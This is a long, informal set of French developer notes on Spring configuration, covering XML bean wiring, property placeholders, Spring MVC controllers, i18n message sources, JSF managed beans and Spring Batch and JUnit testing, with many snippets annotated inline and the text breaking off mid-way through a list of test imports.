          		http://www.springframework.org/schema/util/spring-util.xsd // ce xsd. On peut trouver la definition sur cet url dans internet. les classes associees sont dans voir fichier jar/META-INF/spring.handlers
          		http://www.springframework.org/schema/context 
          		http2://www.springframework.org/schema/context/spring-context.xsd
          		http://www.springframework.org/schema/mvc
          		http://www.springframework.org/schema/mvc/spring-mvc.xsd">
          		
            pour importer d'autres fichiers de conf:
                <import resource="spring-datasource.xml"/> 
                <import resource="classpath*:spring-datasource.xml"/>
                <import resource="classpath*:/META-INF/spring/batch-datasource-ctx-common.xml" />
          pour que le serveur puisse acceuillir deux instances d'une meme applis (deux applicationcontext pareils) utiliser jmx:
                            <?xml version="1.0" encoding="UTF-8"?>
                            <beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                            xmlns:int-jmx="http://www.springframework.org/schema/integration/jmx" xmlns:context="http://www.springframework.org/schema/context"
                            xsi:schemaLocation="http://www.springframework.org/schema/integration/jmx http://www.springframework.org/schema/integration/jmx/spring-integration-jmx.xsd
                                http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd
                                http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-3.0.xsd">
                                <int-jmx:mbean-export id="integrationMBeanExporter" default-domain="spring.application.mybatch" server="mbeanServer" />
                                <context:mbean-export default-domain="UN NOM A DONNER POUR CETTE GRAPPE DE BEANS" server="mbeanServer" />
                            </beans>
                            
        <beans xmlns=".......>
        	 <bean id="samlResponseFilter" class="com.hraccess.hraspace.sso.saml.filter.SAMLAuthResponseFilter" MAIS si je met abstract="true" je n'ai pas besoin de donner une classe à ce bean.  
                                            parent="abstractSamlFilter" 
                                            init-method="initFilter"(init-method ca veut dire qu'il va appeler la methode init de mon bean InitTest quand toutes les proprietes ci dessous seront chargees(cad au demarrage du serveur) MAIS sinon au lieu de faire ca il suffit de mettre @postConstruct() en tête de ma methode init : permet d'initialiser des donnees// l'oppose à ca c'est destroy-method dont equivalent en annot c @preDestroy) scope="singleton" ou "prototype" (a chaque appel il en fait un nouveau) ou "request" ou "session" ou "global session">
                		<property name="parser" ref="parserPool" />
                		<property name="uriComparator" ref="uriComparator" />
                		<property name="principalExtractor" ref="principalExtractor" />
                  <constructor-arg index="0" value="blibli"/>// moins bien que ci-dessus: envoie les arguments au constructeur de la classe qui doit donc avoir ces deux arguments là en entree
                          <constructor-arg index="1" value="bloblo"/>
                          maintenant ma classe InitTest contient un getter setter de testString et une metode void init()
            </bean>
            <bean id="unbeanStringUniquement" class="java.lang.String"><constructor-arg><value>${environnement}</value></constructor-arg>
            <bean id="unBeanQuiSinitialiseDeFaconComplettementCustomisable" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
            			<property name="targetClass" value="ma.classe.QuiSeraAppelee" />
			            <property name="targetMethod" value="laMethodeDeMaClasseQuiSeraAppelee" />
			             <property name="arguments"> // ca se sont les arguments de ma methode quiseraappelee
                        				<list> // pour faire des listes avec spring : tous ces elements sont au meme niveau dans la liste mais on peut faire des listes de liste et l'ordre dedans est conservé
                        					<ref bean="uneDdataSourceDeclaree" />
                        					<value>
                        						<![CDATA[
                        						selecte tototo ? ...tititi...?
                        						]]>
                        					</value>
                        					<value>unstringparexemple</value>
                        				</list>
			             </property>
		          </bean>	
              autre exemple de bean custo generique general de type map
                            <bean name="ioutils" id="ioutils" class="com.hraccess.tools.utils.IOUtils">
                            <property name="rolemapping"> //rolemapping>0>hmap>entry=list<String>
                            			<util:map> //	besoin xmlns:util="http://www.springframework.org/schema/util" + http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util.xsd"> 
                            						<entry key-ref="excelTemplateBeansFormation">
                            	                    <list>
                            	                    	<value>FPCRFFIL</value>
                            	                        <value>FPCSIEGE</value>
                            	                    </list>
                            	               </entry>
                            	               <entry key-ref="excelTemplateBeansGest">
                            	               	<list>
                            			        	<value>GESTPAIE</value>
                                                	<value>RESPFIL</value>
                            				   </list>
                            				 </entry>
                                		</util:map>
                                </property>
                            </bean>
                puis 
                <bean id="excelTemplateBeansForm" class="org.springframework.beans.factory.config.MapFactoryBean"> // pour pouvoir faire un getBean en java
                  <property name="sourceMap" ref="excelTemplatesForm" />
               </bean>
               <bean id="excelTemplateBeansGest" class="org.springframework.beans.factory.config.MapFactoryBean">
                  <property name="sourceMap" ref="excelTemplates" />
               </bean>
                          <property name="testString" value="blahblah"/>" // la valeur de cette propriete sera blahblah
                          <property name="testClass" ref="idDunAutreBean"/>" // testClass est un setter qui prend en param l'interface de la classe autrebean.java
                          ou sinon dans classe en met ces annot : @Autowired
                                                                  @Qualifier("valueDuTagQualifierDuBeanImplementeDefiniDansLaConfigXml OU BIEN dunBeanDeclaréParLinkQualifierx") // puree de merde c'est nul à chier!!!!!Ne pas utiliser autowired et qualifier mais bon. avec java plus le choix : exemple :
                                                                  
                                                                  LinkQualifierx : 
                                                                          @Repository
                                                                          @Qualifier("userRepositoryLdap")
                                                                          public class UserRepositoryLdapImpl implements UserRepository
              injection conditionnelle:
                        <bean id="iddubean" class="com.MaClasse1ParDefaut" />
                        <beans profile="unProfile"> ou profile="unprofile,default" (mettre defaut si quand le profile n'est pas defini par spring.profiles.active ca choisisse ce bean). Cette balise beans est à mettre tout à la fin du fichier xml juste avant le dernier </beans>
                            <!-- Override `le precedent bean si unProfile Est actif -->
                            <bean id="iddubean" class="com.MaClasse2" />
                        </beans> 
             et placer WEB-INF/applicationcontext.xml (fichier spring) (c'est le front controller)
                   <beans xmlns=".......>
<!-- Spring MVC : springmvc : -->
                                                   <!-- the mvc resources tag does the magic  ainsi il va chercher les css, images js sous webapp/ressources quand dans jsp on met : <spring:url value="/resources/core/css/hello.css" var="coreCss" />-->
                                                   <!-- Handles HTTP GET requests for /resources/** by efficiently serving up static resources in the ${webappRoot}/resources directory -->
                                                      <mvc:resources mapping="/resources/**" location="/resources/" />
                                                                <mvc:default-servlet-handler />
                                                                <mvc:annotation-driven />
                                    <!-- pour utiliser les @ : scan les java qui ont :@Controller, @ComponentGENERIQUEEVITERDUTILISERUtiliser@Named, @Repository, @Service(instancie mon service au demarrage) @Inject(equivalent de @Autowired mais Inject n'est pas une annotation JEE), @Named(equivalent de @Qualifier), @PostConstruct: ces annotations servent juste de remplacement de la conf du xml du spring. C pareil mais dans le code java -->
                                     <context:component-scan base-package="mon.path.java"> pour plusieurs packages: <context:component-scan base-package="x.y.z.service, x.y.z.controller" />           
                                            <!-- pour ignorer les @Controller dans CE ApplicationContext et du coup ne pas instancier les classes marquees par @Controller -->                   
                                                <context:exclude-filter type="annotation" expression="org.springframework.stereotype.Controller"/>
                                      </context:component-scan>
                                  
                                                 <!--bof si on @--><bean id="HandlerMapping" class="org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping (le plus basique)"/> <!-- scanneur d'url dit au front controleur  que tous les /welcome.html doivent diriger vers le controlleur MaclasseMonCOntrolleur -->
                                                  <!--bof si on @--><bean name="/welcome.html" class="com.monrpojet.MaclasseMonCOntrolleur (voir plus bas l'implementation)"/>        <!-- Inutile de faire ce mapping ici si j'utilise l'annotation @RequestMapping("/welcome") dans mon controlleur -->
                                                  <bean id="viewResolver" class="org.springframework.web.servlet.view.InternalResourceViewResolver" (le plus basique)><!-- dit quelle type de vue utiliser (prefix suffix. Voir plus bas viewResolver) -->
                                                          <property name="prefix">
                                                            <value>/WEB-INF/</value>
                                                          </property>
                                                          <property name="suffix">
                                                            <value>.jsp</value>
                                                          </property>
                                                  </bean>
                                                  OU BIEN si je veux faire des views qui renvoient autre chose : pdf, xls etc... je rajoute ça : 
                                                   <bean id="viewResolver2" class="org.springframework.web.servlet.view.XmlViewResolver">
                                                      <property name="order" value="1"/>
                                                      <property name="location" value="/WEB-INF/views.xml"/> ----> spring va lire ce fichier qui est : 
                                                  </bean>
                                                           views.xml :
                                                               <?xml version="1.0" encoding="UTF-8"?>
                                                                <beans xmlns="http://www.springframework.org/schema/beans"
                                                                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                                                                xsi:schemaLocation="http://www.springframework.org/schema/beans
                                                                http://www.springframework.org/schema/beans/spring-beans-3.0.xsd">
                                                                <bean id="excelView" class="mon.package.MonExcelBuilder" />--------> creer une classe MonExcelBuilder : public class ExcelBuilder extends AbstractExcelView {org.springframework.web.servlet.view.document.AbstractExcelView) Overrider buildExcelDocument
                                                                </beans>                 
                        <!-- dans ce fichier je vais stocker les messages par ex : dans le fichier mesmessages.properties mettre : Size.student.sonchamp="titit{min} ljksdflo {max} sdlksd" voir @size
                                              // pour gerer les multiparts (upload de fichiers)
                                            <bean id="multipartResolver"  class="org.springframework.web.multipart.commons.CommonsMultipartResolver" /> 
                                  
                                        <!-- i18n internationalisation: dans ce fichier je vais stocker les messages par ex : dans le fichier mesmessages.properties mettre : Size.student.sonchamp="titit{min} ljksdflo {max} sdlksd" voir @size
                                                                                                                                                                              Size.student.sonchamp doit etre en unicode: si accent faire une conversion vers unicode en ligne http://www.ratfactor.com/utf-8-to-unicode: les espaces c'est \u0020
                                       <bean id="messageSource" class="org.springframework.context.support.ReloadableResourceBundleMessageSource">
                                          <property name="basename" value="/WEB-INF/mesmessagesJeCroisQueLaConventionC'estmessages"/> ou value="file:///D:/RD/conf/msg (j'ai un msg_fr_FR.properties etc...) ou classpath:messages ou file:///sma/hr/d2/bin/gta/conf/msg.properties"/>(ca je crois que ça ne marche pas!)
                                          que pour le dev mettre : <property name="cacheSeconds" value="1"/> pour qu'il recharge chaque seconde le fichier mesmessages_xx_XX.properties sans avoir a redemarrer serveur
                                                  <property name="useCodeAsDefaultMessage" value="true"/> pour qu'il renvoit la cle si traduction pas trouvee           
                                        </bean>
                                        Puis definir comment le local va être resolu: valeur de cookie? Valeur de Session?...au choix cidessous
                                        <!--  attention le nom "localeResolver" doit etre respecte pour que spring prenne ce localeResolver-->              
                                                     <bean id="localeResolver" class="org.springframework.web.servlet.i18n.CookieLocaleResolver">// c'est lui qui def mon locale à partir du cookie 
                                            					<property name="cookieName" value="com.hraccess.portal.last_language"/> // ce  nom de cookie determinera mon locale exemple : response.addCookie(new Cookie("com.hraccess.portal.last_language", "us_US"));
                                            			</bean> ensuite voir ci dessous l'utilisation de localeresolver
                			                            ou bien 
                			                           <bean id="localeResolver" class="org.springframework.web.servlet.i18n.SessionLocaleResolver" />
                			                        Pas sur que j'ai besoin de ça pour en cas de changement de locale(?): regarder dedans:
                      			                        	<!-- <mvc:interceptors>
                                                        		<bean class="org.springframework.web.servlet.i18n.LocaleChangeInterceptor">
                                                        			<property name="paramName" value="locale" />
                                                        		</bean>
                                                        	</mvc:interceptors> -->

                            dans les jsp: 
                                  <spring:message code="lacledansmesfichiermsg" text="default text" />
                              en java recuperer le message i18n : 
                                    @RequestMapping(value = "/inputbadge", method = RequestMethod.POST//est GET par defaut, produces = MediaType.APPLICATION_JSON_VALUE)
                                    @ResponseBody
                                    //@ResponseStatus(HttpStatus.OK)
                                    public OutputBadge inputBadge(Locale locale, @RequestBody InputBadge inputBadge, HttpServletResponse httpServletResponse) throws Exception {
                                        boolean res = false;
                                        recup le locale grace au localeresolver: 
                                            LocaleResolver localeResolver = RequestContextUtils.getLocaleResolver(request); Locale locale = localeResolver.resolveLocale(request);
                                            @Autowired
	                                           private MessageSource msg; //c le bean messageSource defini ci dessus
                                        String titi = msg.getMessage("tatata",new Object[]{},locale); ou msg.getMessage("tatata",new Object[]{"baba","bibi"},locale); ou locale.FR pour forcer le locale 
                                    msg_fr_FR.properties : 
                                            tototi=Hello, {0} sdlksdfs{1} // attention, tototi doit etre en unicode. possible utiliser http://www.ratfactor.com/utf-8-to-unicode les espaces c'est \u0020
                                            h\u00E9\ toi\ salut=blalbalbe
                        proprietes property properties : ATTENTION ON NE PEUT PAS DEFINIR DEUX PLACEHOLDER SINON IL NEN PREND QUN EN COMPTE ET JE PEUX AVOIR LERREUR Could not resolve placeholder
                                  <!-- utilise ce fichier de propriete qui lui meme contient des ${maVariable} (qui seront remplis par maven) Attention: il est specifique à ce fichier xml là donc pour les pom.xml fils il faudra aussi faire cette definition si besoin(les fils n'ont pas accès aux params du père) -->
                              <context:property-placeholder location="file:///${ext.prop.dir}db.properties"/> où ${ext.prop.dir} est une propriete système. pour qu'il aille chercher les proprietes à l'exterieur.  Peut etre dans un autre fichier de configuration xml que celui qui va utiliser les ${} pour appeler les proprietes
                              <context:property-placeholder location="classpath:/*.properties/> <!-- le fichier .properties est sous src/main/resources mais il serra mis sous classes par maven. les variables de ce fichier rempliront les variables ${} du fichier xml actuel (voir!! "connection a une database" -->. ${} est aussi rempli par les -D
                              <context:property-placeholder location="file:///${catalina.base}(chemin.absolu unix) ou file:///D:/conf/mdl/import_excel.properties" />(windows) // fichier propriete externe	        
   
                              besoin alors mettre en tete:    xmlns:context="http://www.springframework.org/schema/context" + xsi:schemaLocation="http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-3.0.xsd">  
                              <bean id="propertyConfigurerFACULTATIF" class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer"> voir aussi PropertySourcesPlaceholderConfigurer
                                          <property name="locations" value="classpath:com/foo/jdbc.properties"/>
                                          ou si plusieurs 
                                          		<property name="locations">
                                          			<list>
                                          				<value>file:///${ext.prop.dir}/batch-infrastructure.properties</value>
                                          				<value>file:///D:/path/batch-infrastructure.properties</value>
                                          				<value>file:///${ext.prop.dir}/batch-sirh.properties</value>
                                          				<value>/WEB-INF/conf/sso/saml.properties</value> // hummm n'a pas l'air de marcher: alors utiliser plutot ligne ci dessous
                                          				<value>classpath:conf/sso/saml.properties</value> 
                                          				<ref bean="grantConfig"/> et un ya un bean 
                                          				                                      <bean id="grantConfig" class="org.springframework.core.io.UrlResource">
                                                                                      		<constructor-arg ref="grantConfigJndiUrlResource"/>
                                                                                      	</bean>
                                                                                      	<bean id="grantConfigJndiUrlResource" class="org.springframework.jndi.JndiObjectFactoryBean">
                                                                                      		<property name="jndiName"><value>java:comp/env/url/GrantApiJEESS3</value></property>
                                                                                      	</bean>
                                          			</list>
                                          		</property>
                                          		<property name="ignoreUnresolvablePlaceholders" value="true" />
                              </bean>
                              exemple de fichier de propriete: jdbc.properties 
                                                            jdbc.url=${blahEstRempliParMaven}
                          utiliser les proprietes:  
                              <bean id="dataSource" destroy-method="close" class="org.apache.commons.dbcp.BasicDataSource"> //close est appele si mon ((ConfigurableApplicationContext)WebApplicationContextUtils.getRequiredWebApplicationContext(request.getSession(false ou true).getServletContext())).close(); est appele
                              <property name="driverClassName" value="${jdbc.driverClassName}"/> 	
                              <property name="url" value="${jdbc.url}"/>
                              <property name="username" value="${jdbc.username}"/>
                              <property name="password" value="${jdbc.password}"/>
                          </bean>
                          <bean class="org.opensaml.saml2.metadata.provider.FilesystemMetadataProvider" init-method="initialize">
                                    <constructor-arg index="0">
                                        <value type="java.io.File">${com.hraccess.dir.conf}${sp.metadata}</value> // on peut concatener des proprietes. Ici comme c'est un java.io.File, si la concatenation des variables contient l'absolut path vers le fichier, ok ca pointe vers ce fichier mais si c'est juste un nom de fichier ou bien un path relatif (sans / au debut) il cherche à partir du repertoire d'execution du programme
                                    </constructor-arg>
                                </bean>
                       c'est proprietes peuvent être definies dans unfichier.properties mais aussi dans le web.xml comme ça : 
                            <context-param>
                        			<param-name>babababa</param-name>
                        			<param-value>${bibibibi}</param-value> // cette variable là est elle definie dans la java system properties. ensuite seul System.getProperty("babababa") ont accès à cette variable // recupère prop de la jvm voir LINKù*ù
                        	</context-param>
	
                              
           utilisation factory factories:
                voici le factory:
                    <bean id="openhr.session.factory" class="com.hraccess.openhr.HRSessionFactory"
		                      factory-method="getFactory" scope="singleton" />// la meth getFactory de la classe HRSessionFactory peut se renvoyer elle même ou une des implementations d'elle meme
                voici HRSessionImpl qui est cree par retour de la methode createSession du factory ci-dessus		                      
                <bean id="openhr.session" class="com.hraccess.openhr.impl.HRSessionImpl"
                factory-bean="openhr.session.factory" // facultatif: openhr.session=HRSessionImpl=openhr.sessionFactory.createSession()
                factory-method="createSession" 
                destroy-method="disconnect" scope="singleton" depends-on="log4jInitialization">
                <constructor-arg ref="openhr.session.configuration" /> // Attention ça c pas un argument de la classe HRSessionImpl mais c l'argument de la methode createSession du factory openhr.session.factory
                </bean>

          Cycle de vie du bean : 
              – @RequestScoped (par defaut)
              – @SessionScoped
              – @ApplicationScoped // le bean est utilise pourl es proprietes generales de l'appli: ex: listes deroulantes qu'on voit tout le temps
              – @ViewScoped
              – @CustomScoped pour que les beans soient stockees dans le FacesContext (qui a une duree de vie plus courte que RequestScope donc FC est plus rapide, bouffe moins de memoire)
              – @NoneScoped (si c un bean qui est reference par un autre bean qui lui est scoped)
              >> attention un bean ne peut pas referencer un autre bean si son scope est plus petit que le sien (sauf les @NoneScoped que tous peuvent referencer)
                  @PostConstruct-->Le bean est place dans son scope
                  public void debut() { ... }
                  @PreDestroy--->bean est retire du scope ou le scope est detruit.
                  public void fin() { ... }
          
      BOF.......Ca c pour JSF :
              FacesContext context = FacesContext.getCurrentInstance();
              Application application = context.getApplication();
              String userid = (String)application.evaluateValueExpressionGet(context,"#{userBean.userid}", String.class);
              ou
              ELContext elContext = context.getELContext();
              ValueExpression ve = expressionFactory.createValueExpression(elContext,"#{userBean.userid}",String.class); // ou bien meme "#{userBean}",UserBean.class
              String userid=ve.getValue(elContext);
          pour setter la valeur d'un param d'un bean dans sa session en java:
              FacesContext context = FacesContext.getCurrentInstance();
              Application application = context.getApplication();
              ELContext elContext = context.getELContext();
              ExpressionFactory expressionFactory = application.getExpressionFactory();
              ValueExpression ve = expressionFactory.createValueExpression(elContext,"#{userBean.userid}",String.class); // ou bien meme "#{userBean}",UserBean.class
              // possible recup propriete comme ca aussi : String userId = (String)ve.getValue(elContext); // ou bien meme pour recup le bean de son scope: UserBean user=(UserBean)ve.getValue(elContext);
              ve.setValue(elContext, "newUserId");
          pour executer une methode d'un bean dans sa session :
              FacesContext context = FacesContext.getCurrentInstance();
              Application application = context.getApplication();
              ELContext elContext = context.getELContext();
              ExpressionFactory expressionFactory = application.getExpressionFactory();
              MethodExpression me = expressionFactory.createMethodExpression(elContext,"#{userBean.maMethode}",Void.class,null); // ou si arguments dans la methode : , new Class[]{UserInfo.class, String.class});}
              try
              {
                result = me.invoke(context,null); // ou si arguments dans la methode : ,new Object[]{UserInfo(), "laurent dudu"});
                (result=: facultatif si meth renvoit rien)
              }
              catch(ELException e)
              {
                Throwable wrapped = e.getCause();
              }
           Instanciation de managed bean de type ArrayList ou HashMap ou java.util.Set  par defaut on the fly disponible partout dans le fichier faces-config.xml se fait de manière lazy quand besoin.
                  <managed-bean>
                    <managed-bean-name>moreSports</managed-bean-name>
                    <managed-bean-class>java.util.ArrayList</managed-bean-class>
                    <managed-bean-scope>none</managed-bean-scope>
                    <list-entries>
                      <value>Skiing</value>
                      <value>Tennis</value>
                      <value>#{moreSports[0]}</value> // un autre bean declare ici
                    </list-entries>
                  </managed-bean>
  variables applicatives (disponibles pour tous les utilisateurs: possible de les definir au demarrage de l'appli avec un SystemEventListener voir SystemEventListener ci-dessus)
        Map<String,Object> appMap=FacesContext.getCurrentInstance().getExternalContext().getApplicationMap();
        appMap.get("toto"); / pererer utiliser: map.entrySet().iterator();... entry=iter.next();... entry.getKey(); entry.getValue(); c plus rapide a l'execution
        appMap.set("titi",monObjet);                               
                    
                  service layer : exemple loginUser(){.. ou transferMoney(){... appelle plusieurs DM
                        contient AOP aspectOrientedProgramming grace à Interceptors(Before/after) sont parametres grâce à Pointcuts Ou design pattern proxy (qui remplace ma classe implementee et du coup contient son code) 
                          aspect : AOP
                          reutiliser des petits programmes ou on veut par parametrage spring
                          poincut = intersection de notre code avec le programme aspect
                          voir P34: on prog 1 aspect puis @aspect (aspecj)
                                      utile pour transactions
                                                            mettre @Transactional devant classe ou methode // rend ma methode dans une transaction
                                                            AF pourquoi mettre transactional pour readonly requettes?
                                                  loging
                                      utile pour la securite decouplee du code
  .............BOF                   
    dans classe qui etend httpservlet, dans methode Init:recuperer l'applicationcontext de l'appli web.xml : 
        ApplicationContext wac= WebApplicationContextUtils.getRequiredWebApplicationContext(servletConfig.getServletContext());   
    Suite springMVC spring mvc mon controlleur :
                            // AVEC ANNOTATION :
                            @Controller
                            (optionnel)@RequestMapping("/welcome") Si je mets ca , mon url doit etre : /welcome/autrechemin (par ex) //est GET par defaut
                            @RestController pour qu'il soit cap de renvoyer que du JSON ou XML(je crois) (pour webservice et ajax) : a mettre en tête de classe: equivaut a mettre : @Controller en tete de classe +  @ResponseBody devant  chaque methode
                            @Scope("request") (par exemp<le) ou @Scope(ConfigurableBeanFactory.SCOPE_SINGLETON)                             
                            public class MaClasseMonController // NE PAS l'appeler Controller tout court
                            {
                                @RequestMapping(value="/monpath.html",method=RequestMethod.POST) (pour mettre les deux get et post et get : method={ RequestMethod.GET, RequestMethod.POST }) //est GET par defaut
                                public ModelAndView helloworld(@ModelAttribute("student1") Student student1, BindingResult sierrorlorsdubiding) //bind les parametres de mon formulaire id="student1" avec les champs ayant un name:"toto" avec mon objet Student qui a une methode getsetToto
                                                                                                              Bind avec n'importe quel type de var : date, arraylist etc...Meme les objets sous-jacents
                                                                                                              si je veux personaliser mon binding il faut utiliser une methode annotee avec @InitBinder (voir InitBinder)
                                {
                                  if (sierrorlorsdubiding==true) // si erreurs lors du biding 
                                  {
                                             ModelAndView modv = new ModelAndView("leNomDeMaJsp");  grace au viewResolver (voir config spring au dessus)
                                           return modv;
                                    }
                                  else{
                                    ModelAndView modv = new ModelAndView("leNomDeMaJspDeMaViewEnFait");  grace au viewResolver (voir config spring au dessus)
                                     INUTILE GRACE A @ModelAttribute-> //modv.addObject("student",student); <- inutile.
                                    return modv;
                                    }
                                }
                                @ResponseBody // en tete de methode ou de classe pour qu'il soit cap de renvoyer que du json même si je retourne un objet java(webservice mais inutile si j'ai mis @RestController en tête de classe)
                                @RequestMapping(value="/monpath.html",method=RequestMethod.POST) //est GET par defaut
                                @RequestMapping("/welcome") // plus besoin de mettre dans le frontcontroller
                                ou bien avec url parametre en get
                                @RequestMapping("/welcome/{parametre1}/{parametre2}") // url: /welcome/toto/titi
                                @RequestMapping(value="/welcome", method=RequestMethod.POST ou .GET(pardefaut)) // url: /welcome/toto/titi
                                public ModelAndView helloworld(@Valid//pourPrendreEnCompteLesAnnotAuDessusDesGettersEtSettersDeMesBeansPojo(voir @Size)@ModelAttribute(") //bind les parametres de mon formulaire avec l'objet Student                                
                                 {
                                    ModelAndView modv = new ModelAndView("leNomDeMaJspDeMaViewEnFait");  grace au viewResolver (voir config spring au dessus)
                                     modv.addObject("student",student);
                                    return modv; 
                                }
                                public ModelAndView helloworld()
                                {
                                    ModelAndView modv = new ModelAndView("leNomDeMaJspDeMaViewEnFait");  grace au viewResolver (voir config spring au dessus)
                                    modv.addObject("monMessage","tataaaaa");
                                    return modv; // avec le viewResolver ca va afficher du coup : META-INF/leNomDeMaJsp.jsp
                                }
                                
                                
	//@RequestMapping(value="/postcommentagency", consumes = "multipart/form-data" ou consumes={"toto","titi",MediaType.APPLICATION_JSON_VALUE}, method = RequestMethod.POST)
                                @RequestMapping(value="/postcommentagency", method = RequestMethod.POST) // pour recup en JSON (voir aussi plus haut) un formulaire
                                	public String postCommentAgency(MultipartHttpServletRequest request, HttpServletResponse response){...          	         
	
                            	public ModelAndView postCommentAgency(@RequestBody Object[]ou ObjetJavaAvecAnnotations  comment) //@RequestPart Map map)// @RequestBody LinkedMultiValueMap<String, Object> requestBody) pour recuperer du JSON ou du XML
	
                                ATTENTION @PathVariable c pour l'URL ex:x/y/z @RequestParam c pour la request ex:?filter=x : pour un post ca se met comme ca dans le body du post : paramname+"="+paramvalue;
                                public ModelAndView helloworld(@PathVariable("parametre1") String monparam1, @PathVariable("parametre2") String monparam2)
                                public ModelAndView helloworld(@PathVariable Map<String,String> rePathVar)
                                public ModelAndView helloworld(@RequestParam(value="parametre1",defaultValue="siParametre1EstNullVide", required=true) String monparam1, @RequestParam("parametre2") String monparam2)
	//@RequestMapping(value="/postcommentagency", consumes = "multipart/form-data", method = RequestMethod.POST)
	//public ModelAndView postCommentAgency(@RequestBody Object[]  comment) //@RequestPart Map map)// @RequestBody LinkedMultiValueMap<String, Object> requestBody)
	@RequestMapping(value="/postcommentagency", method = RequestMethod.POST)
	public String postCommentAgency(MultipartHttpServletRequest request, HttpServletResponse response)
	{
	System.out.println(request);
	//commentAgencyDao.postComment(comment, idagency);
          pour recuperer un fichier des resources sous src\test\resources\json\request.json properties 
                new ClassPathResource("json/request.json").getFile()
                exemple : new Scanner(new ClassPathResource("json/request.json").getFile()).useDelimiter("\\Z").next(); //voir regexp LINKçeeçeeçregexpçeeçeeç   


	}
	@RequestMapping(value="/postcommentdeparture", method = RequestMethod.POST)
	public ModelAndView postCommentDeparture(@RequestParam("comment") String comment, @RequestParam("departure") int iddeparture)
	{

		commentDepartureDao.postComment(comment, iddeparture);
		ModelAndView modv = new ModelAndView("detail");
		modv.addObject("commented",true);
		return modv;
	}
                                
                                public ModelAndView helloworld(@RequestParam Map<String,String> rePar)
                                {
                                  monparam1; //est dispo!
                                  reqPathVar.get("monParametre1");
                                  reqPar.get("monParametre1");
                                
                                  
                                    ModelAndView modv = new ModelAndView("leNomDeMaJspDeMaViewEnFait");  grace au viewResolver (voir config spring au dessus)
                                    modv.addObject("monMessage","tataaaaa"+monparam1);
                                    modv.addObject("monMessage",unObjetAvecDesGetters);
                                    return modv; // avec le viewResolver ca va afficher du coup : META-INF/leNomDeMaJsp.jsp
                                }                        
                            }
                            // SANS UTILISER D ANNOTATIONS:
                            MaclasseMonCOntrolleur extends AbstractController
                            {
                              handleRequestInternal(Http... request , Htt... respons)
                              {
                                ModelAndView modv = new ModelAndView("leNomDeMaJspDeMaViewEnFait");  grace au viewResolver (voir config spring au dessus)
                                modv.addObject("monMessage","tataaaaa");
                                return modv; // avec le viewResolver ca va afficher du coup : META-INF/leNomDeMaJsp.jsp
                              }
                            }
                            @InitBinder
                            public void monTraitementCustomiseLorsDuBiding(WebDataBinder binder)
                            {
                              binder.setDissalowedFields(new String[] {"monChampAIgnorerLorsDuBiding"});
                              SimpleDateFormat dateFormat = new SimpleDateFormat etc et... // attention n'est pas threadsafe.
                              binder.registerCustomEditor(Date.class,"monChampDate",new CustomDateEditor(dateFormat,false)//caPeutEtreUneClasseAMoiPourCustomiser: Build-in PropertyEditors) exemple : 
                                                                                                                                                @InitBinder
                                                                                                                                                	public void monTraitementCustomiseLorsDuBiding(WebDataBinder binder) {
                                                                                                                                                
                                                                                                                                                		binder.registerCustomEditor(String.class, "departureHour", new PropertyEditorSupport() {
                                                                                                                                                					public void setAsText(String text) {
                                                                                                                                                						setValue(text.replaceAll("\\s+", ""));
                                                                                                                                                					}
                                                                                                                                                				}
                                                                                                                                                		);
                                                                                                                                                		binder.registerCustomEditor(String.class, "departureTime", new PropertyEditorSupport() {
                                                                                                                                                			public void setAsText(String text) {
                                                                                                                                                				setValue(text.replaceAll(":", "h"));
                                                                                                                                                			}
                                                                                                                                                		}
                                                                                                                                                		);
                            }
                            Mon objet beanPojo : validation des champs
                                @Size(min=2, max=30, message="titit{min} ljksdflo {max} sdlksd")
                                @Size(min=2, max=30) // vient de la librairie de Hibernate. message d'erreur par defaut
                                @Past // doit être une date dans le futur
                                monSetter(String toto) 
                                
                              leNomDeMaJsp.jsp
                              <%@ taglib prefix="form" uri="http://www.springframework.org/tags/form"%> // pour la balise <form:errors
                              <html>
                              <form:errors path="student1.*">   // fonctionne avec le BindingResult
                              <h2>${monMessage}</h2>
                              <h2>${monObjet.unGetterDeMonObjet}</h2>  
                              </html>
                          Les messages :
                              mesmessages.properties                        
                                    Size.student.sonchamp="titit{min} ljksdflo {max} sdlksd" voir @size
                                    Size.autrecledobjet.sonchamp="titit{0} ljksdflo {1} sdlksd{2} 0 = champ, 1=min,2=max voir @size                                    

Spring-batch :
    voir ci dessous spring-batch-tester tests : test :
        pour tester un job ou un step:
                            @Test
                            public void testLaunchJob() throws Exception {
                                  JobExecution jobExecution = jobLauncherTestUtils.launchJob();
                                  assertEquals(cequonattendsBatchStatus.COMPLETED, jobExecution.getStatus());
                                  JobExecution jobExecution = jobLauncherTestUtils.launchStep("step1");
                                  assertEquals(BatchStatus.COMPLETED, jobExecution.getStatus());
                                          
  Spring pour tester avec junit :  XML et JAVA style:
      a lire : https://dzone.com/articles/unit-and-integration-tests-in-spring-boot
                http://stackoverflow.com/questions/12058098/spring-testing-framework-jndi-resource/12058370#12058370        
                  pour faire mes tests sur une base h2 locale :
                                    par defaut : jdbc:h2:~/test
                                    sous test/resources/application.properties
                                          spring.datasource.initialize=true //si true, au demarrage springboot execute toujours schema-PLATEFORME*.sql // mettre PLATEFORM=all pot plateformes.
                                          spring.datasource.driverClassName=org.h2.Driver                                           data-PLATEFORME*.sql
                                          spring.datasource.url=jdbc:h2:mem:testdb;Mode=Oracle                                      to_date n'existe pas utiliser parsedatetime('01/09/13 00:00:00','dd/MM/yy hh:mm:ss')
                                          spring.datasource.platform=PLATEFORME*//voir ci dessous
                                          spring.datasource.continue-on-error=false
                                          spring.datasource.validation-query=select count(*) from ZY00 (...)
                                                                                      
                                    package com.project.tests.idea.dao;
                                    import static xxx.yyy.zzz.user // methode statique de Mockery
                                    import static xxx.yyy.zzz.status // methode statique de Mockery
                                    import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;
                                    import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
                                    import static org.springframework.test.web.servlet.result.MockMvcResultHandlers.print;
                                    import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
